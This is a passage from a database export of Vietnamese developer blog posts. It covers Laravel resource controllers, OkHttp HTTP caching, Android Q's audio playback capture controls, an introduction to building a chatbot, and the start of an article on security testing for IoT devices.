'PhotoController')->except([\n    'create', 'store', 'update', 'destroy'\n]);\n```\nHàm `only()` sẽ chỉ sử dụng các action trong mảng bạn truyền vào, còn hàm `except()` sẽ sử dụng tất cả ngoại trừ các action trong mảng truyền vào.\n\n## Ghi đè name routes\nMặc định tất cả các route trong resource controller sẽ có tên như trong bảng bên trên. Tuy nhiên bạn có thể ghi đè tên route bằng cách sau đây:\n```php\nRoute::resource('photos', 'PhotoController')->names([\n    'create' => 'photos.build'\n]);\n```\n## Kết luận\nVâỵ là mình đã giới thiệu xong cho các bạn về Resource controller trong laravel. Nếu có thắc mắc hay ý kiến gì các bạn có thể comment bên dưới để mình hoàn thiện bài viết hơn.\n\nMình xin cảm ơn!	Giới thiệu\nTrong laravel, việc sử dụng các route post, get, group để gọi đến 1 action của Controller đã là quá quen đối với các bạn sử dụng framework này.\nTrong 1 dự án, làm việc với các action đọc, thêm, xóa, sửa có lẽ là không thể tránh khỏi. Như vậy với mỗi action này, ta sẽ phải viết 1 dòng route::method(). Như thế sẽ dẫn đến việc file route của các bạn sẽ dài và khó đọc.\nLaravel cung cấp c...	{}	1	Tìm hiểu về Resource Controller trong Laravel	{resource-controller,laravel}	0	f	2022-12-18 15:33:38.135+00	2022-12-18 15:33:38.135+00
31961	- Xin chào các bạn, bài viết này mình sẽ giới thiệu tới các bạn  về cách mà OkHttp Cache làm việc như thế nào?.\n- Để hiểu về cách nó hoạt động, trước tiên chúng ta cần biết Http Cache là gì?\n\n## HTTP Cache\n- Quá trình fetching dữ liệu qua mạng gây chậm và tốn kém, với các response kích thước lớn đòi hỏi nhiều roundtrips giữa client và server, nó sẽ gây ra delay và khi\nbrowser có thể xử lý chúng cũng phát sinh chi phí dữ liệu khi truy cập. Do đó, khả năng lưu trữ và sử dụng lại các tài nguyên được tải trước đó là một vấn đề quan trọng\ntrong việc tối ưu hóa hiệu năng.\n- Một điều tuyệt vời là mọi browser hiện nay đều có HTTP cache. Việc cần làm là đảm bảo rằng một response từ server cung cấp các HTTP header chính xác để chỉ cho \nbrowser về thời gian có thể lưu response.\n\n![](https://images.viblo.asia/e64c3393-e9fd-4443-9e1d-0616206c0c3a.png)\n\n- Khi server trả về response, nó cũng trả về một tập hợp các HTTP header, miêu tả nó như là content-type, length, caching directives, validate token,...\nVí dụ như hình trên, server trả về response bao gồm kích thước 1024-byte, chỉ cho client có thể lưu trữ trong 120s, validate token là "x234dff".\n\n## Xác thực cached response với ETags.\n- Giả sử sau 120s kể từ lần fetch ban đầu và Browser chuẩn bị một request mới cho cùng một resource. Đầu tiên Browser sẽ kiểm tra local cache để tìm response trước đó,\nnhưng do response trước đó đã hết hạn nên Browser không thể sử dụng nó. Do đó, Browser có thể gửi request mới để fetch response mới. Tuy nhiên, điều này không hiệu quả vì\nnếu dữ liệu không có sự thay đổi thì không có lý do gì để tải xuống cùng một thong tin đã có trong cache.\n- Để giải quyết vấn đề trên, validate token (Etags) được sử dụng. Server sẽ generates và trả về một token tùy ý, thường là một hàm băm hoặc fingerprint của nội dung file. Client\nkhông cần biết mã đó được tạo như thế nào, nó chỉ cần gửi mã đó đến server trong request. Nếu mã không thay đổi thì client không cần phải tải xuống gì cả.\n\n\t![](https://images.viblo.asia/d11b42a1-3237-4b19-bdbf-fc7ef0c21ab3.png)\n\n- Trong ví dụ trên, client tự động cung cấp Etag token trong HTTP request header "If-None-Match". Server sẽ kiểm tra token dựa trên resource hiện tại. Nếu token không\ncó sự thay đổi, server sẽ trả về một response "304 Not Modified" để thông báo cho Browser biết response đã có trong cache không có sự thay đổi và có thể sử dụng nó trong 120s\nnữa.\n- Câu hỏi đặt ra là làm thế nào để nó hoạt động? Câu trả lời là chúng ta không phải làm gì cả, Browser sẽ thực hiện hết công việc đó. Điều cuối cùng cần làm là đảm bảo rằng server\nđang cung cấp Etag token cần thiết. Cấu hình cờ cần thiết:  [file config](https://github.com/h5bp/server-configs)\n\n## Cache-control\n- Mỗi resource có thể định nghĩa cách cache của nó thông qua Cache-Control HTTP header.\n- Cache-Control kiểm soát ai có thể cache response, trong điều kiện nào và trong thời gian bao lâu.\n- Với vấn đề tối ưu hóa hiệu năng, request tốt nhất là một request không cần liên lạc với server, một local copy của response cho phép loại bỏ tất cả các độ trễ của mạng,\ntránh phí dữ liệu cho việc truyền dữ liệu. Để đạt được điều này, HTTP cho phép server trả về Cache-Control để control như thế nào, trong bao lâu và Browser và các bộ\nđệm trung gian khác có thể lưu trữ phản hồi riêng lẻ.\n\n\t![](https://images.viblo.asia/72a06fa0-4316-456c-9e84-0e1b517cb3f6.png)\n\n### no-cache và no-store\n- "no-cache": chỉ ra rằng response trả về không thể được sử dụng để đáp ứng request tiếp theo cho cùng một URL mà không cần kiểm tra trước với server nếu response đã\nthay đổi. Kết quả lả nếu có validation token (Etag) hợp lệ, không có cache phát sinh để xác thực response được lưu trong cache, nhưng có thể loại bỏ tải xuống\nnếu tài nguyên không thay đổi.\n- "no-store": Không cho phép các Browser và tất cả các bộ nhớ cache trung gian lưu trữ bất kỳ version nào của response. Ví dụ, một bộ dữ liệu cá nhân hoặc ngân hàng riêng tư, mỗi\nkhi user request tài sản này, một request được gửi đến server và response đầy đủ được tải xuống.\n\n### public và private\n- pubic: Response có thể được lưu vào cache ngay cả khi nó có HTTP authentication được liên kết và khi response status code không được lưu trong cache. Hầu hết thời gian "public" là\nkhông cần thiết, bởi vì thông tin cache rõ ràng chỉ ra rằng response có thể được lưu trong cache.\n- private: Browser có thể lưu trữ các response "private". Tuy nhiên, những response này thường dành cho một user, do đó cache trung gian không được phép lưu. Ví dụ:\nBrowser của người dùng có thể lưu trữ trang HTML với thông tin người dùng riêng tư, nhưng CDN không thể lưu trữ trang.\n\n### max-age\n- Chỉ định thời gian tối đa tính bằng giây mà response được phép sử dụng lại từ thời điểm request. Ví dụ max-age = 60 chỉ ra rằng response có thể được lưu trữ và sử dụng lại trong\n60s tiếp theo.\n\n## Invalidating và updating cached response\n- Tất cả các request HTTP mà Browser thực hiện trước tiên được chuyển đến cache của Browser để kiểm tra xem có response được lưu trong cache hợp lệ có thể được sử dụng để đáp ứng request\nhay không. Nếu có sự trùng khớp, response được đọc từ cache.\n- Điều gì sẽ xảy ra nếu bạn muốn cập nhật hoặc làm mất hiệu lực của response được lưu trong cache? Ví dụ bạn đã cung cấp cho khách hàng lưu trữ kiểu CSS trong cache tối đa\n24h, nhưng designer vừa commit một version cập nhật mới mà bạn muốn cung cấp cho tất cả người dùng. Làm thế nào để bạn thông báo cho tất cả khách hàng truy cập có bản sao\nđược lưu trong bộ nhớ cache của CSS để cập nhật bộ nhớ cache của họ? Bạn không thể, ít nhất là không thay đổi URL của resource.\n- Sau khi Browser lưu response,version được lưu trong cache được sử dụng cho đến khi nó không còn mới như được xác định bởi max-age hoặc khi bị xóa khỏi cache.\n- Làm thế nào để bạn có thể có được thứ tốt nhất từ cache của Browser và cập nhập nhanh? Bạn thay đổi URL của tài nguyên và buộc người dùng tải xuống response mới bất cứ\nkhi nào nội dung có sự thay đổi. Thông thường làm điều này bằng cách nhúng fingerprint hoặc version trong tên tệp của nó. Ví dụ như: style.x234dff.css\n\n\t![](https://images.viblo.asia/fc668125-c9e1-4857-b4c9-eee13ecf30f6.png)\n\n- Khả năng xác định các chính sách lưu trữ trên mỗi resource cho phép bạn xác định "cache hierarchies" giúp kiểm soát không chỉ mỗi bộ nhớ cache trong bao lâu, mà còn cả\nclient truy cập xem các version mới nhanh như thế nào. Như ví dụ trên:\n\t+ HTML: Được đánh dấu là "no-cache", có nghĩa là Browser luôn xác nhận lại tài liệu theo từng request và fetch version mới nhất nếu nội dung thay đổi. Ngoài ra\ntrong HTML còn có fingerprint vào URL cho các tài sản CSS và JavaScript: nếu nội dung của các tệp thay đổi thì HTML cũng thay đổi và bản sao của HTML response được tải\nxuống.\n\t+ CSS: được phép lưu vào cache của Browser và cache trung gian (Ví dụ CDN) và được đặt hết hạn sau 1 năm. Nếu CSS thay đổi thì URL cũng sẽ thay đổi.\n\t+ JavaScript: Cũng được thiết lập hết hạn sau 1 năm, nhưng được control là private.\n\t+ Photo: Được lưu vào cache mà không có version hoặc fingerprint và hết hạn sau 1 ngày.\n\n## Android OkHttp cache work\n- Trong phần trên chúng ta đã hiểu về HTTP cache, tiếp theo chúng ta xem cách nó hoạt động như thế nào?\n- Đây là sơ đồ cách hoạt động của OkHttp Cache.\n\n\t![](https://images.viblo.asia/bc8b7783-7483-4ad9-bdbb-9412c34b0970.png)\n\n- Việc thực hiện Cache response với OkHttp3 chúng ta chỉ cần tạo vùng nhớ cache để lưu, bởi vì trong OkHttp3 đã hỗ trợ tất cả rồi.\n- Enable cache:\n \n\t![](https://images.viblo.asia/bb2bc0f3-0d5f-427c-9b73-a9e3514560f2.png)\n\n- Nó sẽ làm việc thế nào? Chúng ta không phải làm gì cả, nó sẽ tự động phân tích header liên quan đến cache từ server và lưu response vào cache.\n\n### How to make it works offline?\n- Server trả về max-age để nói cho OkHttp biết rằng có thể lưu trữ response và sử dụng offline.\n- Nếu max-age không có sẵn hoặc hết hạn nhưng bạn vẫn muốn sử dụng local data, bạn có thể sử dụng CacheControl.FORCE_CACHE. Lúc này flow hoạt động trở thành:\n\n\t![](https://images.viblo.asia/5fa21d60-3e93-4bb4-9fbf-3e17de822360.png)\n\n- Nếu bạn luôn muốn sử dụng local cache khi không có Internet:\n\n\t![](https://images.viblo.asia/ba8c753d-7fe2-4494-be83-6a458cd971f7.png)\n### Có nên sử dụng OkHttp để lưu data?\n- Đó là một ý tưởng tồi, bởi vì data luôn phải có sẵn trong khi đó cache có thể có hoặc không.\n\n## Nguồn tham khảo.\n- [HTTP Caching](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching)\n- [How does Android OkHttp cache work?](https://medium.com/@I_Love_Coding/how-does-okhttp-cache-works-851d37dd29cd)	- Xin chào các bạn, bài viết này mình sẽ giới thiệu tới các bạn  về cách mà OkHttp Cache làm việc như thế nào?.\n- Để hiểu về cách nó hoạt động, trước tiên chúng ta cần biết Http Cache là gì?\n\nHTTP Cache\n- Quá trình fetching dữ liệu qua mạng gây chậm và tốn kém, với các response kích thước lớn đòi hỏi nhiều roundtrips giữa client và server, nó sẽ gây ra delay và khi\nbrowser có thể xử lý chúng cũ...	{https://images.viblo.asia/e64c3393-e9fd-4443-9e1d-0616206c0c3a.png,https://images.viblo.asia/d11b42a1-3237-4b19-bdbf-fc7ef0c21ab3.png,https://images.viblo.asia/72a06fa0-4316-456c-9e84-0e1b517cb3f6.png,https://images.viblo.asia/fc668125-c9e1-4857-b4c9-eee13ecf30f6.png,https://images.viblo.asia/bc8b7783-7483-4ad9-bdbb-9412c34b0970.png,https://images.viblo.asia/bb2bc0f3-0d5f-427c-9b73-a9e3514560f2.png,https://images.viblo.asia/5fa21d60-3e93-4bb4-9fbf-3e17de822360.png,https://images.viblo.asia/ba8c753d-7fe2-4494-be83-6a458cd971f7.png}	1	How does Android OkHttp cache work?	{android}	0	f	2022-12-18 15:33:38.204+00	2022-12-18 15:33:38.204+00
31956	![](https://2.bp.blogspot.com/-fbrmoKKIVEs/XRqd5mhJTnI/AAAAAAAAJhM/vpSAo10DeGoKInMNYOGvkzbHIVu604yNQCLcBGAs/s1600/Apps%2Band%2Bmicrophone%2Bv2.png)\nTrên Android Q được ban hành có một API mới cho phép ứng dụng ghi âm lại âm thanh của một ứng dụng. Đó là [AudioPlaybackCapture API](https://developer.android.com/preview/features/playback-capture) và nó cho phép một số trường hợp sử dụn quan trọng cho việc chia sẻ nội dung và tiếp cận được dễ dàng.\n\nCác ví dụ bao gồm:\n\n- **Live captioning**: cho phép nội dung âm thanh của ứng dụng đang chạy hiện tại để ghi chú hoặc biên dịch theo thời gian thực (**Real time**). Trên thực tế, tính năng [Live Caption](https://www.youtube.com/watch?v=hPv1PkjJ-J0) được trình diễn ở Google I/O năm nay là một phần của API này. Tính năng này cho phép người dùng tương tác với các nội dung có thể nghe thấy được ngay cả khi chúng không thể hoặc bất tiện để làm ví dụ như nghe tại các địa điểm công cộng khi không có headphones.\n- **Game recording và streaming**: Âm thanh trong game có thể được ghi âm lại và phát trực tiếp tới các khác giả, giúp bạn tăng khả năng tương tác với mạng xã hội với các nội dung game liên quan.\n\nSẽ có thể một số trường hợp khi developer mong muốn không cho phép ứng dụng khác ghi âm ứng dụng của họ. Bài viết này sẽ giải thích tính năng ghi âm này hoạt động như thế nào đối với người dùng và developer có thể ngăn chặn ứng dụng thứ 3 ghi âm ứng dụng của họ nếu cần.\n\n#### Người dùng sẽ thấy gì?\n\nKhi ghi âm audio của ứng dụng khác, người dùng cần phải cho phép [Quyền Ghi Âm](https://developer.android.com/reference/android/Manifest.permission#RECORD_AUDIO) để ứng dụng có thể chạy tính năng này.\n\n![](https://3.bp.blogspot.com/-v-OC6Rj-7DU/XRqcVWGeUeI/AAAAAAAAJgw/dPhi2iFHaA4nk5VF5gBGCIJhDFcekJn0QCLcBGAs/s1600/image1.png)\n\nNgoài ra, để một phiên ghi âm có thể chạy thì ứng dụng ghi âm sẽ phải gọi [MediaProjectionManager.createScreenCaptureIntent()](https://developer.android.com/reference/android/media/projection/MediaProjectionManager#createScreenCaptureIntent()). Nó sẽ hiển thị dialog dưới cho người dùng nhận biết việc ghi âm sẽ start như thế nào.\n\n![](https://4.bp.blogspot.com/-Sx_t-bIpW5A/XRqcnxKpEqI/AAAAAAAAJg4/CxWubwSVzUAdJMggie2QtTiPwYtVpeurwCLcBGAs/s1600/image2.png)\n\nNgười dùng phải chọn **"Start now"** để việc ghi âm được bắt đầu, nó cho phép cả video lẫn âm thanh được ghi âm cùng một thời điểm và icon Cast sẽ được hiển thị màu đỏ trên *Status Bar*.\n\n![](https://3.bp.blogspot.com/-tIBcfupRCbY/XRqc1AvjKPI/AAAAAAAAJg8/1EfBOio9f3svtaUocggLTsgYLRfyP0wwgCLcBGAs/s1600/image3.png)\n\n#### Ứng dụng của tôi có thể bị ghi lại?\n\nTrường hợp này ta sẽ so sánh **Target API** từ 28 trở xuống và 29 (Android Q).\n\n- Mặc định ứng dụng bên thứ ba có thể ghi lại âm thanh của bạn?\n1. **API từ 28 trở xuống:** Không thể, ứng dụng cần phải có chính sách rõ ràng **-** [Capture Policy](https://developer.android.com/preview/features/playback-capture#capture_policy)\n2. **API 29:** Có thể đối với âm thanh khi sử dụng *Audio Usage* là *MEDIA, GAME và UNKNOWN*\n\n- Mặc định ứng dụng của hệ thống và các thành phần có thể ghi lại âm thanh ứng dụng của bạn? Đối với trường hợp này thì giống như trường hợp thứ 2 đó là có thể đối với âm thanh khi sử dụng *Audio Usage* là *MEDIA, GAME và UNKNOWN*.\n\n#### Ngăn chặn việc ghi âm bởi ứng dụng bên thứ 3\nSẽ có một số trường hợp mong muốn ngăn chặn việc âm thanh của ứng dụng được ghi âm bởi các ứng dụng khác bởi vì âm thanh có thể chứa:\n\n- **Thông tin nhạy cảm** - âm thanh riêng tư, thông tin các nhân.\n- **Tài liệu bản quyền** - ví dụ như các bài nhạc bản quyền từ các bộ phim, ca sỹ.\n\n#### Cách ngăn chặn việc ghi âm tất cả âm thanh từ ứng dụng bên thứ 3\nĐể ngăn chặn việc này thì bạn có thể chọn 1 trong 2 cách dưới đây: \n\n1. Thêm **android:allowAudioPlaybackCapture="false"** vào trong **AndroidManifest.xml**\n\n``` Kotlin\n<application\n...\nandroid:allowAudioPlaybackCapture="false"/>\n```\n\n2. Thêm **AudioManager.setAllowedCapturePolicy(ALLOW_CAPTURE_BY_SYSTEM)**  vào trong code ngay khi khởi tạo ứng dụng.\n\nNgoài ra có thể ngăn chặn một số ứng dụng được chỉ định bằng cách **AudioAttributes.Builder.setAllowedCapturePolicy(ALLOW_CAPTURE_BY_SYSTEM)**. Ví dụ như ứng dụng của bạn có các âm thanh bản quyền và không bản quyền, nó sẽ phân tách cho phép người dùng được ghi âm lại âm thanh không bản quyền và ngược lại.\n\n#### Ngăn chặn việc ghi lại bởi ứng dụng hệ thống và các thành phần\nTheo mặc định, các ứng dụng và thành phần hệ thống được phép thu âm thanh của ứng dụng nếu việc sử dụng là MEDIA, GAME và UNKNOWN, vì điều này cho phép các trường hợp sử dụng khả năng truy cập quan trọng.\n\nTrong trường hợp nguy hiểm khi developer mong muốn chặn việc ghi âm bởi ứng dụng hệ thống, việc này cũng sẽ ngăn chặn ứng dụng bên thứ 3 ghi âm ứng dụng của bạn.\n\n#### Ngăn chận ghi lại tất cả các âm thanh \nTa chỉ việc thêm dòng code dưới đây \n```\nAudioManager.setAllowedCapturePolicy(ALLOW_CAPTURE_BY_NONE)\n```\n\nCòn đối với việc ngăn chặn ghi âm theo các chính sách\n\n```\nAudioAttributes.Builder.setAllowedCapturePolicy(ALLOW_CAPTURE_BY_NONE)\n```\n\n#### Tiếp theo?\nNếu ứng dụng của bạn targeting tới API 28 hoặc thấp hơn và bạn muốn bật tích năng ghi âm, thêm **android:allowAudioPlaybackCapture="true"** vào trong app *manifest.xml* của bạn.\n\nNếu muốn chặn tất cả hoặc một số audio, hãy xem các hướng dẫn tại bài viết phía trên.\n\n*Sources*: \n\nhttps://developer.android.com/preview/features/playback-capture\nhttps://android-developers.googleblog.com/2019/07/capturing-audio-in-android-q.html?linkId=69868955	![](https://2.bp.blogspot.com/-fbrmoKKIVEs/XRqd5mhJTnI/AAAAAAAAJhM/vpSAo10DeGoKInMNYOGvkzbHIVu604yNQCLcBGAs/s1600/Apps%2Band%2Bmicrophone%2Bv2.png)\n\n\nTrên Android Q được ban hành có một API mới cho phép ứng dụng ghi âm lại âm thanh của một ứng dụng. Đó là AudioPlaybackCapture API và nó cho phép một số trường hợp sử dụn quan trọng cho việc chia sẻ nội dung và tiếp cận được dễ dàng.\n\nCác ví dụ bao gồm:\n\n- Live captioning: cho phép nội dung âm thanh của ứng dụng đang chạy hiện tại để ghi chú hoặc biên dịch theo thời gian thực (Real time). Trên...	{https://2.bp.blogspot.com/-fbrmoKKIVEs/XRqd5mhJTnI/AAAAAAAAJhM/vpSAo10DeGoKInMNYOGvkzbHIVu604yNQCLcBGAs/s1600/Apps%2Band%2Bmicrophone%2Bv2.png,https://3.bp.blogspot.com/-v-OC6Rj-7DU/XRqcVWGeUeI/AAAAAAAAJgw/dPhi2iFHaA4nk5VF5gBGCIJhDFcekJn0QCLcBGAs/s1600/image1.png,https://4.bp.blogspot.com/-Sx_t-bIpW5A/XRqcnxKpEqI/AAAAAAAAJg4/CxWubwSVzUAdJMggie2QtTiPwYtVpeurwCLcBGAs/s1600/image2.png,https://3.bp.blogspot.com/-tIBcfupRCbY/XRqc1AvjKPI/AAAAAAAAJg8/1EfBOio9f3svtaUocggLTsgYLRfyP0wwgCLcBGAs/s1600/image3.png}	1	Tính năng ghi âm trong Android Q	{android-q,audio}	0	f	2022-12-18 15:33:38.227+00	2022-12-18 15:33:38.227+00
31935	<div align="center">\n    \n# Lời mở đầu\n</div>\n\n- Xin chào mọi người, mình lại quay trở lại rồi đây. Sau những loạt bài tìm hiểu về tài liệu của các công nghệ (Vue/Laravel) có vẻ không thu hút được sự chú ý của mọi người lắm, nên lần này mình quyết định sẽ "THINK OUTSIDE THE BOX" và tìm hiểu một cái mới mẻ hơn và có thể áp dụng vào thực tế vui hơn. Đó chính là tự làm **ChatBot** bằng **Laravel** và sử dụng cho [**ChatWork**](https://www.chatwork.com) nhé! (ChatBot Facebook mình nghĩ cũng tương tự thôi)\n- Và ở trong part 1 này, mình xin phép giới thiệu qua một chút về lý thuyết trước, còn phần source code cũng như là demo thì xin hẹn các bạn ở part 2 nhé!\n\n<div align="center">\n    \n# Nội dung\n</div>\n\n<div align="center">\n    \n## ChatBot là gì\n</div>\n\n- Nếu các bạn từng chơi **Counter Strike** hay gần đây hơn là **PUBG Mobile** thì chắc hẳn đã quen với khái niệm Bot, nhưng thay vì bắn nhau với người dùng thì ChatBot sẽ làm nhiệm vụ trò chuyện cùng người dùng. Và cách mà ChatBot nói chuyện như thế nào (ngu hay khôn) thì sẽ do bản thân các bạn quyết định.\n    - Ở những level cơ bản thì ChatBot sẽ hoạt động theo kiểu khi nhận được các keyword có sẵn, ChatBot sẽ trả lời theo như kịch bản đã được lên từ trước, nói nôm na là kiểu switch case ấy.\n    - Còn ở trình độ cao hơn thì có thể tích hợp **AI** và **Machine Learning** vào để cho Bot tự học và phát triển thêm. Cái tên nổi tiếng nhất mà mình tin ai cũng từng nghe qua và sử dụng đó chính là [**SimSimi**](https://www.simsimi.com/) (con Bot lầy lội nhất mà mình từng thấy), ngoài ra còn có thể kể đến các trợ lí ảo rất nổi tiếng như là [**Siri (Apple)**](https://www.apple.com/siri/), [**Google Assistant**](https://play.google.com/store/apps/details?id=com.google.android.apps.googleassistant&hl=en), [**Cortana (Microsoft)**](https://support.microsoft.com/en-us/help/17214/cortana-what-is)\n\n- Sau 2 phần của bài viết này, mình sẽ hướng dẫn các bạn tự làm ra 1 con ChatBot cho riêng mình, và tất nhiên là nó chỉ dừng lại ở mức độ đơn giản thôi :blush::blush::blush::blush::blush::blush: \n- Còn nếu muốn xây dựng hẳn 1 trợ lí ảo thì bạn có thể tham khảo bài viết [**này**](https://viblo.asia/p/build-your-own-artificial-intelligence-assistant-similar-to-google-assistant-GrLZD8BBZk0) hoặc liên hệ trực tiếp với [**tác giả**](https://viblo.asia/u/QuangPH)!\n\n<div align="center">\n    \n## Tại sao lại cần đến ChatBot\n</div>\n\n- Đối với người dùng cá nhân:\n    - Dùng để nhắc việc: thử tưởng tượng xem, mỗi buổi sáng thức dậy sẽ có một con Bot dự báo thời tiết để bạn chuẩn bị trang phục cho phù hợp, đến giờ họp, giờ ăn trưa Bot sẽ tự động gửi tin nhắn nhắc nhở bạn, tiện quá phải không?\n    - Dùng để tra cứu thông tin: khi bạn muốn tìm kiếm các bài báo/nghe nhạc, thay vì bạn tự lên search google thì chỉ cần 1 cú pháp đơn giản, ChatBot sẽ gửi lại cho bạn danh sách kết quả cần tìm\n    - Đến ngày sinh nhật thì có Bot nhắn tin chúc mừng, quan tâm cho bớt cảm giác cô đơn (FA lâu quá nên bệnh nặng lắm rồi :D)\n- Đối với người kinh doanh/doanh nghiệp:\n    - Trả lời khách hàng tự động: đối với người kinh doanh/doanh nghiệp thì số lượng nhân viên để chăm sóc khách hàng thì có hạn, mà số lượng người dùng thì lại quá lớn không thể đáp ứng ngay lập tức được. Còn về phía khách hàng, nếu họ phải chờ tin nhắn trả lời quá lâu thì xin chia buồn, bạn đã mất đi 1 vị khách rồi đấy. Để giải quyết vấn đề này, ChatBot sẽ giúp trả lời khách hàng gần như ngay lập tức (với những câu hỏi được lên kịch bản sẵn) và cũng giảm được sức người (con người không thể trực tổng đài 24/24 được nhưng ChatBot thì có, miễn là không bị rút nguồn :D)\n    - Tự động thông báo khi hệ thống gặp sự cố: có thể tỉnh thoảng server của bạn lăn ra chết mà không rõ lí do, nhưng lúc đó lại chẳng ai theo dõi để mà bật lại server cả, thế là dịch vụ của bạn chết tầm vài tiếng. Nghe thì có vẻ đơn giản nhưng hậu quả của nó thì rất lớn nếu như có nhiều người sử dụng (cứ thử Facebook sập 1 tiếng xem kết quả thế nào)\n\n<div align="center">\n    \n## Để làm được ChatBot thì cần tìm hiểu những gì\n</div>\n\n- Trước hết để làm được thì bạn cần tìm hiểu xem nguyên lí hoạt động của nó như thế nào trước đã. Về cơ bản, quá trình hoạt động của ChatBot gồm 3 bước chính:\n    - **Bước 1 (Translator)**: Nhận input từ khách hàng, dịch ra giúp máy hiểu đúng công việc mình cần thực hiện.\n    - **Bước 2 (Processor)**: Xử lý yêu cầu, cái này thì do bạn lập trình cho nó thôi (con Bot khôn hay ngu quyết định là ở 2 bước này đấy :D)\n    - **Bước 3 (Respondent)**: Sau khi xử lý yêu cầu thì trả lại kết quả thu được cho người dùng.\n\n![](https://images.viblo.asia/8516974e-c37e-48d8-ab4b-b0b6c8c07cbb.png)\n\n<div align="center">\nhình ảnh minh hoạ cho quá trình làm việc của chatbot    \n</div>\n    \n- Vì là Chatbot nên chắc chắn nó sẽ phải hoạt động trên một nền tảng tin nhắn nào đó. Với thời đại hiện nay thì không quá khó để có thể kể ra những cái tên như Facebook Messenger, Line, Zalo, ... Và những ông lớn này đều cung cấp sẵn các API cũng như là platform để chúng ta có thể xây dựng và phát triển ChatBot chạy trên sản phẩm của họ. Và quan trọng nhất là hầu như chúng đều public và miễn phí. Ví dụ như: [Facebook Messenger](https://rapidapi.com/dimashirokov/api/FacebookMessenger), [Zalo](https://developers.zalo.me/docs/api/official-account-api/phu-luc/lam-the-nao-de-tao-chatbot-tra-loi-tu-dong-voi-zalo-api-post-1698), ...\n\n- Ngôn ngữ lập trình: về cơ bản thì ngôn ngữ lập trình chỉ là công cụ để thực hiện thôi. Các ngôn ngữ bây giờ đều có các Framework cũng như các **SDK (Software Development Kit)** để phát triển ChatBot rồi. Chỉ cần bạn quen với ngôn ngữ nào thì sử dụng nó sẽ nhanh hơn và đỡ mất công tìm hiểu hơn thôi. \n \n=> Mình chọn LARAVEL. CÒN BẠN THÌ SAO?\n\n<div align="center">\n    \n# Lời kết\n</div>\n\nQua part 1 này, hi vọng các bạn đã nắm được cách thức hoạt động cơ bản của ChatBot cũng như là ứng dụng thực tế của nó. Hãy cùng chờ đón part 2 nhé, mình sẽ lên bài sớm thôi!\n\n<div align="center">\n    \n# Tài liệu tham khảo\n</div>\n\n- https://viblo.asia/tags/chatbot\n- https://viblo.asia/p/tat-ca-nhung-gi-ban-can-biet-ve-chatbot-Az45bnNg5xY\n- https://www.google.com/	\n\nLời mở đầu\n\n\n- Xin chào mọi người, mình lại quay trở lại rồi đây. Sau những loạt bài tìm hiểu về tài liệu của các công nghệ (Vue/Laravel) có vẻ không thu hút được sự chú ý của mọi người lắm, nên lần này mình quyết định sẽ "THINK OUTSIDE THE BOX" và tìm hiểu một cái mới mẻ hơn và có thể áp dụng vào thực tế vui hơn. Đó chính là tự làm ChatBot bằng Laravel và sử dụng cho ChatWork nhé! (ChatBot F...	{https://images.viblo.asia/8516974e-c37e-48d8-ab4b-b0b6c8c07cbb.png}	1	Tự tạo chatbot cho riêng mình. Tại sao không? (Part 1)	{chatbot,laravel}	0	f	2022-12-18 15:33:38.259+00	2022-12-18 15:33:38.259+00
31923	Kỉ nguyên Internet of Things (IoT), nơi mà kết nối giữa các thiết bị ở khắp mọi nơi, đã xuất hiện. Năm 2017, đã có 8.4 tỉ thiết bị được kết nối (lớn hơn dân số của cả thế giới), và con số này được kì vọng sẽ tăng lên tới 20.4 tỉ vào năm 2020.\n\nCùng với việc các thiết bị được kết nối đưa vào cuộc sống của mỗi chúng ta, điều này đem đến một tác động lớn với chúng ta - Cả tốt lẫn xấu.\n\n## Vạch trần những lổ hổng bảo mật tiềm năng của các thiết bị IoT\nTác giả bài viết có một trải nghiệm với IoT khi mua một vài webcam và lắp đặt trong nhà, và thực sự đó là một trải nghiệm mở rộng tầm mắt.\nKhi tiến hành nghiên cứu các lựa chọn của bản thân, có những comment với nội dung tương tự xuất hiện lặp đi lặp lại trong các review với tất cả camera. Mọi ra người chỉ ra rằng họ gặp vấn đề bảo mật đối với camera, một số nói rằng họ không đồng tình với điều khoản và sử dụng của các thiết bị này, những điều khoản cho phép nhà sản xuất truy nhập vào dữ liệu data người dùng được thu thập bởi các camera.\n\nHiện tại, nếu bạn cho là những điều khoản này không đáng lo ngaị, những nghiên cứu gần đây chỉ ra rằng có đến nửa triệu thiết bị ở Barelona (bao gồm cả webcam và các thiết bị màn hình nhỏ) rất dễ bị tấn công cyber attack. Không chỉ dễ bị tấn công, các phụ huynh còn báo cáo rằng các hacker chiếm quyền giám sát con họ.\n\n## Đưa vấn đề bảo mật của các thiết bị IoT vào quan điểm\nCâu chuyện về webcam phơi bày vấn đề bảo mật nghiêm trọng của các thiết bị IoT cần được giải quyết. Rất nhiều người trong số chúng ta hiện nay đều kết nối giữa nhà và nơi làm việc, những kết nối này khiến cuộc sống dễ dàng hơn, nhưng tồn tại rất nhiều vấn đề phức tạp phía sau mà chúng ta không hề nghĩ tới. Các thiết bị IoT thực hiện rất nhiều chức năng tính từ quan điểm kiến trúc thiết kế - kết nối với WiFi, lưu trữ dữ liệu trên AWS, charge thẻ tín dụng và danh sách cứ tiếp tục.\n\nTuy nhiên, những kết nối cứ tiếp tục sâu dần, và rủi ro về về bảo mật cũng vậy, càng có nhiều kết nối với mỗi thiết bị chúng ta có, càng có thêm kết nối chúng ta cung cấp cho các hacker truy cập vào data người dùng.\n\n## Software Testing trong kỉ nguyên IoT: Sẵn sàng cho một trò chơi mạo hiểm mới\nCùng với số lượng thiết bị IoT tiếp tục tăng lên, tiềm năng về rủi ro bảo mật cũng sẽ tăng theo. Kết quả, các chúng ta test các kết nối phần mềm này cần thay đổi. Và sự thay đổi này không sớm thì muộn sẽ phải thay đổi.\n\nCụ thể, dưới đây là 3 cách quan trọng để bạn phát triến hướng tiếp cận test trong kỉ nguyên IoT\n\n### 1. Giới thiệu về Continuous Security Testing\nMột trong những lí do khiến IoT tự mở ra những lỗ hổng tấn công bảo mật chính là bởi có quá nhiều cổng kết nối và có rất nhiều sự kiện xảy ra cùng với những kết nối này, sẽ rất dễ dàng mất dấu những dấu gây ra những rủi do bảo mật này. Nhưng khi tìm hiểu sâu hơn về IoT, sẽ cần có sự thay đổi, vậy nên Continuous Security Testing sẽ là chìa khoá để khiến điều này trở nên khả thi.\n\nPhần lớn thời gian hiện nay, testing team thực hiện security và load testing ở cuối tiến trình phát triển sau khi đã hoàn thành toàn bộ unit và functional test. Nhưng khi chúng ta test security cuối cùng, nó sẽ trở thành bước bổ sung chứ không phải một quá trình xuyên suốt. Để có được mô hình bảo mật tốt nhất, 